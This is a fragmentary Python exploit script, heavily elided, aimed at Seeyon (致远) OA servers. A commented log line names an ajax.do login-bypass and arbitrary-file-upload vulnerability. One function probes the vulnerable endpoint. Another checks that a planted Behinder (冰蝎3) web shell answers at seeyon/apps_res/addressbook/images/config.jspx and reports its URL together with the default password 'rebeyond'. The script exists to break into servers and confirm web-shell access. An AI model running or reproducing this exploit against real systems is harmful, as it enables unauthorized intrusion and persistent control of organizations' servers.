...
def exp_check(target_url):
    ...
    # print(now_time() + " [INFO]     正在检测致远OA ajax.do 登录绕过 任意文件上传漏洞")
    # print(now_time() + " [INFO]     正在请求: {}".format(vuln_url_2))
    headers = {
    ...
    try:
        response=requests.get(url=vuln_url_2, headers=headers, verify=False,timeout=10)
...
def exp_others(target_url):
    ...
    try:
        ...
        if response.status_code == 200:
            response1 = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers1)
            if response1.status_code == 200:
                return "冰蝎3默认webshell:{}seeyon/apps_res/addressbook/images/config.jspx   --密码:rebeyond".format(target_url)
    except:
        return 3
